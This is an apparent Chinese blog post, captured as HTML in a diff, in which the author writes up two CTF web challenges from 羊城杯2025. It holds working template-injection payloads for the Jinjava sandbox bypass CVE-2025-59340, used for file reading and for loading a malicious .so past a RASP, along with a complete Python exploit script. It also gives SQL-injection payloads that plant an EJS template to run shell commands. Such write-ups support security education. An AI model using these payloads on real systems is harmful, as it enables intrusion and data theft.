@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>羊城杯2025 金Java&amp;ezsigin Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, ctf, Web">
+<meta name="description" content="菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我
+金Java
+考点：CVE-2025-59340漏洞复现&#43;RASP绕过">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="https://blog.xrntkk.top/post/ycb2025-record/">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <meta name="referrer" content="no-referrer-when-downgrade">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.317863601f03c2b94974bf53f8aaac583e7d21f7d74106e5602576c147c6f679.css" integrity="sha256-MXhjYB8DwrlJdL9T&#43;KqsWD59IffXQQblYCV2wUfG9nk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://blog.xrntkk.top/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://blog.xrntkk.top/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://blog.xrntkk.top/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://blog.xrntkk.top/apple-touch-icon.png">
+<link rel="mask-icon" href="https://blog.xrntkk.top/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://blog.xrntkk.top/post/ycb2025-record/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="https://blog.xrntkk.top/post/ycb2025-record/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="羊城杯2025 金Java&ezsigin Writeup">
+  <meta property="og:description" content="菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我
+金Java 考点：CVE-2025-59340漏洞复现&#43;RASP绕过">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-10-13T14:00:00+08:00">
+    <meta property="article:modified_time" content="2025-10-13T14:00:00+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="羊城杯2025 金Java&amp;ezsigin Writeup">
+<meta name="twitter:description" content="菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我
+金Java
+考点：CVE-2025-59340漏洞复现&#43;RASP绕过">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://blog.xrntkk.top/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "羊城杯2025 金Java\u0026ezsigin Writeup",
+      "item": "https://blog.xrntkk.top/post/ycb2025-record/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "羊城杯2025 金Java\u0026ezsigin Writeup",
+  "name": "羊城杯2025 金Java\u0026ezsigin Writeup",
+  "description": "菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我\n金Java 考点：CVE-2025-59340漏洞复现+RASP绕过\n",
+  "keywords": [
+    "writeup", "ctf", "Web"
+  ],
+  "articleBody": "菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我\n金Java 考点：CVE-2025-59340漏洞复现+RASP绕过\nJinJava是一个基于django模板语法的Java 的模板引擎\n前段时间出了一个CVE-2025-59340，偶然间看到了，有点意思，所以就拿来出题了。\n官方给出的issue描述的很详细：jinjava has Sandbox Bypass via JavaType-Based Deserialization · CVE-2025-59340 · GitHub Advisory Database\n这里我们根据issue，通过java.net.URL可以实现任意文件的读取\n第一步，构造一个JavaType类型的java.net.URL\n{{ ____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.net.URL\")) }} 第二步，利用 Jackson 的 ObjectMapper中的readValue来调用java.net.URL的单参数且参数为String的构造方法\n{{____int3rpr3t3r____.config.objectMapper.readValue('\"file:///etc/passwd\"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.net.URL\"))}} 接着链式调用得到的java.net.URL对象读文件\n{{____int3rpr3t3r____.config.objectMapper.readValue('\"file:///etc/passwd\"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.net.URL\")).openStream().readAllBytes()}} 第三步，利用 Jackson 的 ObjectMapper中的convertValue将readAllBytes()返回的bytes转换成base64\n{{ ____int3rpr3t3r____.config.objectMapper.convertValue(____int3rpr3t3r____.config.objectMapper.readValue('\"file:///etc/passwd\"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.net.URL\")).openStream().readAllBytes(),____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.lang.String\")) }} 实现任意文件读之后，可以利用file协议来看目录\n查看根目录\n{{ ____int3rpr3t3r____.config.objectMapper.convertValue(____int3rpr3t3r____.config.objectMapper.readValue('\"file:/\"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.net.URL\")).openStream().readAllBytes(),____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(\"java.lang.String\")) }} 可以看到flag，但是没有权限读，需要RCE后去用readflag读\n可以读cmdline或者直接看网站目录，可以看到这里上了Rasp\n可以利用任意文件读将Rasp下载下来\n这里把能命令执行的函数的办掉了\n只是表面办了System#load，但是实际上可以利用Runtime#load或者更底层的方法去加载so，也就是利用比较常见的Rasp绕过方法，通过加载恶意so来绕过Rasp\n参考文章：浅谈Java-JNI如何加载动态库时直接执行恶意代码-先知社区\n按照上面构造java.net.URL任意文件读取的方法，我们利用SpelExpressionParser来通过SpEL表达式实现任意代码执行\nPayload如下\n{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue('{}',i.getTypeFactory().constructFromCanonical(\"org.springframework.expression.spel.standard.SpelExpressionParser\")).parseExpression(\"T(java.lang.Runtime).getRuntime().load('/app/expe.so')\").getValue() }} 接着就是写文件，SpelExpressionParser对表达式有长度限制(10000)，我们需要分段上传\n本意是题目不出网，通过写文件的方式去加载so。但是实际比赛的时候题目是出网的，所以可以直接加载远程的so。\n完整EXP\n1import base64 2import re 3 4import requests 5 6def split_and_encode_file(path: str, chunk_size: int = 600): 7 with open(path, \"rb\") as f: 8 while True: 9 chunk = f.read(chunk_size) 10 if not chunk: 11 break 12 yield base64.b64encode(chunk).decode(\"ascii\") 13 14path = \"exp.so\" 15templates = \"\"\"{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue('{}',i.getTypeFactory().constructFromCanonical(\"org.springframework.expression.spel.standard.SpelExpressionParser\")).parseExpression(\"T(java.nio.file.Files).write(T(java.nio.file.Paths).get('expe.so'), T(java.util.Base64).getDecoder().decode('content'),T(java.nio.file.StandardOpenOption).CREATE,T(java.nio.file.StandardOpenOption).APPEND)\").getValue() }}\"\"\" 16 17burp0_url = \"http://ip:port/\" 18 19for idx, part in enumerate(split_and_encode_file(path, chunk_size=7000)): 20 template = templates.replace(\"content\",part) 21 burp0_data = {\"name\": template} 22 post = requests.post(burp0_url, data=burp0_data) 23 # print(post.text) 24 25payload = \"\"\"{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue('{}',i.getTypeFactory().constructFromCanonical(\"org.springframework.expression.spel.standard.SpelExpressionParser\")).parseExpression(\"T(java.lang.Runtime).getRuntime().load('/app/expe.so')\").getValue() }}\"\"\" 26post = requests.post(burp0_url, data={\"name\": payload}) 27# print(post.text) 28payload = \"\"\"{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.convertValue(i.readValue('\"file:///tmp/123\"',i.getTypeFactory().constructFromCanonical(\"java.net.URL\")).openStream().readAllBytes(),i.getTypeFactory().constructFromCanonical(\"java.lang.String\")) }}\"\"\" 29post = requests.post(burp0_url, data={\"name\": payload}) 30 31base = re.search(r'Hello,\\s*(.*?)', post.text).group(1) 32print(\"FLAG：\"+ base64.b64decode(base).decode()) ez_signin 这道题是我在大半年前还是大一的时候出的，本意是作为一道简单签到题的，因为没有比较困难或者比较新的考点，都是一些常规的利用，但是没想到解题数相对较少。\n拿到题目是一个登录/注册\n注册的用户没有权限，可以在登陆处直接万能密码登录到admin\n登进去之后是一个文件列表，下载处存在目录穿越\n目录穿越有waf，但是不是很严格，可以直接../app.js读上层目录拿源码\n1const express = require('express'); 2const session = require('express-session'); 3const sqlite3 = require('sqlite3').verbose(); 4const path = require('path'); 5const fs = require('fs'); 6 7const app = express(); 8const db = new sqlite3.Database('./db.sqlite'); 9 10/* 11FLAG in /fla4444444aaaaaagg.txt 12*/ 13 14app.use(express.urlencoded({ extended: true })); 15app.use(express.static(path.join(__dirname, 'public'))); 16app.use(session({ 17 secret: 'welcometoycb2025', 18 resave: false, 19 saveUninitialized: true, 20 cookie: { secure: false } 21})); 22 23app.set('views', path.join(__dirname, 'views')); 24app.set('view engine', 'ejs'); 25 26 27const checkPermission = (req, res, next) =\u003e { 28 if (req.path === '/login' || req.path === '/register') return next(); 29 if (!req.session.user) return res.redirect('/login'); 30 if (!req.session.user.isAdmin) return res.status(403).send('无权限访问'); 31 next(); 32}; 33 34app.use(checkPermission); 35 36app.get('/', (req, res) =\u003e { 37 fs.readdir(path.join(__dirname, 'documents'), (err, files) =\u003e { 38 if (err) { 39 console.error('读取目录时发生错误:', err); 40 return res.status(500).send('目录读取失败'); 41 } 42 req.session.files = files; 43 res.render('files', { files, user: req.session.user }); 44 }); 45}); 46 47app.get('/login', (req, res) =\u003e { 48 res.render('login'); 49}); 50 51app.get('/register', (req, res) =\u003e { 52 res.render('register'); 53}); 54 55app.get('/upload', (req, res) =\u003e { 56 if (!req.session.user) return res.redirect('/login'); 57 res.render('upload', { user: req.session.user }); 58 //todoing 59}); 60 61app.get('/logout', (req, res) =\u003e { 62 req.session.destroy(err =\u003e { 63 if (err) { 64 console.error('退出时发生错误:', err); 65 return res.status(500).send('退出失败'); 66 } 67 res.redirect('/login'); 68 }); 69}); 70 71app.post('/login', async (req, res) =\u003e { 72 const username = req.body.username; 73 const password = req.body.password; 74 const sql = `SELECT * FROM users WHERE (username = \"${username}\") AND password = (\"${password}\")`; 75 db.get(sql,async (err, user) =\u003e { 76 if (!user) { 77 return res.status(401).send('账号密码出错！！'); 78 } 79 req.session.user = { id: user.id, username: user.username, isAdmin: user.is_admin }; 80 res.redirect('/'); 81 }); 82}); 83 84 85 86app.post('/register', (req, res) =\u003e { 87 const { username, password, confirmPassword } = req.body; 88 89 if (password !== confirmPassword) { 90 return res.status(400).send('两次输入的密码不一致'); 91 } 92 93 db.exec(`INSERT INTO users (username, password) VALUES ('${username}', '${password}')`, function(err) { 94 if (err) { 95 console.error('注册失败:', err); 96 return res.status(500).send('注册失败，用户名可能已存在'); 97 } 98 res.redirect('/login'); 99 }); 100}); 101 102app.get('/download', (req, res) =\u003e { 103 if (!req.session.user) return res.redirect('/login'); 104 const filename = req.query.filename; 105 if (filename.startsWith('/')||filename.startsWith('./')) { 106 return res.status(400).send('WAF'); 107 } 108 if (filename.includes('../../')||filename.includes('.././')||filename.includes('f')||filename.includes('//')) { 109 return res.status(400).send('WAF'); 110 } 111 if (!filename || path.isAbsolute(filename) ) { 112 return res.status(400).send('无效文件名'); 113 } 114 const filePath = path.join(__dirname, 'documents', filename); 115 if (fs.existsSync(filePath)) { 116 res.download(filePath); 117 } else { 118 res.status(404).send('文件不存在'); 119 } 120}); 121 122 123 124const PORT = 80; 125app.listen(PORT, () =\u003e { 126 console.log(`Server running on http://localhost:${PORT}`); 127}); 可以看到upload是没有ejs文件的\n而且在login和register处是存在sql注入的\n但是这里有一个坑就是login处的db.get函数不支持执行多条sql语句，也就是说不能堆叠注入。而在register处的db.exec是支持的。\n所以我们可以在register处通过sqlite创建数据库文件的方式，去写ejs模板，打ejs模板渲染\npayload\nadmin');ATTACH DATABASE '/app/views/upload.ejs' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('\u003c%- include(\"/fla4444444aaaaaagg.txt\"); %\u003e');/* 也可以直接RCE去读\n123');ATTACH DATABASE '/app/views/upload.ejs' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('\u003c%=process.mainModule.require(\"child_process\").execSync(\"cat /fla4444444aaaaaagg.txt\") %\u003e');/* ",
+  "wordCount" : "2228",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-10-13T14:00:00+08:00",
+  "dateModified": "2025-10-13T14:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.xrntkk.top/post/ycb2025-record/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.xrntkk.top/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://blog.xrntkk.top/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://blog.xrntkk.top/" title="Xrntkk&#39;s Blog">
+                    <span>首页📔</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/archives/" title="归档">
+                    <span>归档🗃️</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/tags/" title="Tags">
+                    <span>标签🔖</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/search/" title="搜索">
+                    <span>搜索🔎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/links/" title="友链🎈">
+                    <span>友链🎈</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.xrntkk.top/about/" title="关于">
+                    <span>关于👨‍💻</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      羊城杯2025 金Java&amp;ezsigin Writeup
+    </h1>
+<div class="post-meta"><span title='2025-10-13 14:00:00 +0800 CST'>2025-10-13</span>&nbsp;·&nbsp;<span>5 分钟</span>&nbsp;·&nbsp;<span>Xrntkk</span>
+
+<div class="meta-item">&nbsp·&nbsp
+  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
+  </div>      
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e9%87%91java" aria-label="金Java">金Java</a></li>
+                <li>
+                    <a href="#ez_signin" aria-label="ez_signin">ez_signin</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我</p>
+<h1 id="金java">金Java<a hidden class="anchor" aria-hidden="true" href="#金java">#</a></h1>
+<p>考点：CVE-2025-59340漏洞复现+RASP绕过</p>
+<p>JinJava是一个基于django模板语法的Java 的模板引擎</p>
+<p>前段时间出了一个CVE-2025-59340，偶然间看到了，有点意思，所以就拿来出题了。</p>
+<p><img alt="image-20251007231625490" loading="lazy" src="../assets/image-20251007231625490.png"></p>
+<p>官方给出的issue描述的很详细：<a href="https://github.com/advisories/GHSA-m49c-g9wr-hv6v">jinjava has Sandbox Bypass via JavaType-Based Deserialization · CVE-2025-59340 · GitHub Advisory Database</a></p>
+<p>这里我们根据issue，通过java.net.URL可以实现任意文件的读取</p>
+<p>第一步，构造一个JavaType类型的java.net.URL</p>
+<pre tabindex="0"><code>{{ ____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.net.URL&#34;)) }}
+</code></pre><p>第二步，利用 Jackson 的 ObjectMapper中的readValue来调用java.net.URL的单参数且参数为String的构造方法</p>
+<pre tabindex="0"><code>{{____int3rpr3t3r____.config.objectMapper.readValue(&#39;&#34;file:///etc/passwd&#34;&#39;,____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.net.URL&#34;))}}
+</code></pre><p>接着链式调用得到的java.net.URL对象读文件</p>
+<pre tabindex="0"><code>{{____int3rpr3t3r____.config.objectMapper.readValue(&#39;&#34;file:///etc/passwd&#34;&#39;,____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.net.URL&#34;)).openStream().readAllBytes()}}
+</code></pre><p>第三步，利用 Jackson 的 ObjectMapper中的convertValue将readAllBytes()返回的bytes转换成base64</p>
+<pre tabindex="0"><code>{{ ____int3rpr3t3r____.config.objectMapper.convertValue(____int3rpr3t3r____.config.objectMapper.readValue(&#39;&#34;file:///etc/passwd&#34;&#39;,____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.net.URL&#34;)).openStream().readAllBytes(),____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.lang.String&#34;)) }}
+</code></pre><p><img alt="image-20251007233203834" loading="lazy" src="../assets/image-20251007233203834.png"></p>
+<p>实现任意文件读之后，可以利用file协议来看目录</p>
+<p>查看根目录</p>
+<pre tabindex="0"><code>{{ ____int3rpr3t3r____.config.objectMapper.convertValue(____int3rpr3t3r____.config.objectMapper.readValue(&#39;&#34;file:/&#34;&#39;,____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.net.URL&#34;)).openStream().readAllBytes(),____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical(&#34;java.lang.String&#34;)) }}
+</code></pre><p><img alt="image-20251007233338090" loading="lazy" src="../assets/image-20251007233338090.png"></p>
+<p>可以看到flag，但是没有权限读，需要RCE后去用readflag读</p>
+<p><img alt="image-20251007233506482" loading="lazy" src="../assets/image-20251007233506482.png"></p>
+<p>可以读cmdline或者直接看网站目录，可以看到这里上了Rasp</p>
+<p>可以利用任意文件读将Rasp下载下来</p>
+<p><img alt="image-20251007233724418" loading="lazy" src="../assets/image-20251007233724418.png"></p>
+<p>这里把能命令执行的函数的办掉了</p>
+<p>只是表面办了System#load，但是实际上可以利用Runtime#load或者更底层的方法去加载so，也就是利用比较常见的Rasp绕过方法，通过加载恶意so来绕过Rasp</p>
+<p>参考文章：<a href="https://xz.aliyun.com/news/16528">浅谈Java-JNI如何加载动态库时直接执行恶意代码-先知社区</a></p>
+<p>按照上面构造java.net.URL任意文件读取的方法，我们利用SpelExpressionParser来通过SpEL表达式实现任意代码执行</p>
+<p>Payload如下</p>
+<pre tabindex="0"><code>{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue(&#39;{}&#39;,i.getTypeFactory().constructFromCanonical(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;)).parseExpression(&#34;T(java.lang.Runtime).getRuntime().load(&#39;/app/expe.so&#39;)&#34;).getValue() }}
+</code></pre><p>接着就是写文件，SpelExpressionParser对表达式有长度限制(10000)，我们需要分段上传</p>
+<blockquote>
+<p>本意是题目不出网，通过写文件的方式去加载so。但是实际比赛的时候题目是出网的，所以可以直接加载远程的so。</p></blockquote>
+<p>完整EXP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">split_and_encode_file</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">chunk_size</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">600</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunk_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">yield</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;exp.so&#34;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">templates</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{</span><span class="si">% s</span><span class="s2">et i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue(&#39;</span><span class="si">{}</span><span class="s2">&#39;,i.getTypeFactory().constructFromCanonical(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;)).parseExpression(&#34;T(java.nio.file.Files).write(T(java.nio.file.Paths).get(&#39;expe.so&#39;), T(java.util.Base64).getDecoder().decode(&#39;content&#39;),T(java.nio.file.StandardOpenOption).CREATE,T(java.nio.file.StandardOpenOption).APPEND)&#34;).getValue() }}&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://ip:port/&#34;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">part</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">split_and_encode_file</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">chunk_size</span><span class="o">=</span><span class="mi">7000</span><span class="p">)):</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="n">part</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">template</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">post</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="c1"># print(post.text)</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{</span><span class="si">% s</span><span class="s2">et i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue(&#39;</span><span class="si">{}</span><span class="s2">&#39;,i.getTypeFactory().constructFromCanonical(&#34;org.springframework.expression.spel.standard.SpelExpressionParser&#34;)).parseExpression(&#34;T(java.lang.Runtime).getRuntime().load(&#39;/app/expe.so&#39;)&#34;).getValue() }}&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="n">post</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="c1"># print(post.text)</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{</span><span class="si">% s</span><span class="s2">et i=____int3rpr3t3r____.config.objectMapper %}{{ i.convertValue(i.readValue(&#39;&#34;file:///tmp/123&#34;&#39;,i.getTypeFactory().constructFromCanonical(&#34;java.net.URL&#34;)).openStream().readAllBytes(),i.getTypeFactory().constructFromCanonical(&#34;java.lang.String&#34;)) }}&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="n">post</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;div&gt;Hello,\s*(.*?)&lt;/div&gt;&#39;</span><span class="p">,</span> <span class="n">post</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;FLAG：&#34;</span><span class="o">+</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></div><h1 id="ez_signin">ez_signin<a hidden class="anchor" aria-hidden="true" href="#ez_signin">#</a></h1>
+<p>这道题是我在大半年前还是大一的时候出的，本意是作为一道简单签到题的，因为没有比较困难或者比较新的考点，都是一些常规的利用，但是没想到解题数相对较少。</p>
+<p><img alt="image-20251008020759008" loading="lazy" src="../assets/image-20251008020759008.png"></p>
+<p><img alt="image-20251008020810703" loading="lazy" src="../assets/image-20251008020810703.png"></p>
+<p>拿到题目是一个登录/注册</p>
+<p>注册的用户没有权限，可以在登陆处直接万能密码登录到admin</p>
+<p><img alt="image-20251008020942647" loading="lazy" src="../assets/image-20251008020942647.png"></p>
